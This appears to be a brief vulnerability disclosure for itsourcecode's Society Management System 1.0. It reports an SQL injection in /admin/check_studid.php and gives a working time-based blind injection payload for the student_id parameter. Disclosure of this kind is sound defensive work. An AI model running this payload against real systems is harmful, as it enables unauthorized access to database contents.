# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description

After logging into the backend, administrators can query student IDs on the /admin/transaction.php page, but the query interface /admin/check_studid.php has an SQL injection vulnerability.
<img width="1097" alt="image" src="https://github.com/user-attachments/assets/24f54170-e4a3-4dd7-a6a4-3eeddec7ba3a">

# Poc
```
Parameter: student_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student_id=21123123' AND (SELECT 1980 FROM (SELECT(SLEEP(5)))buvY) AND 'zeud'='zeud
```
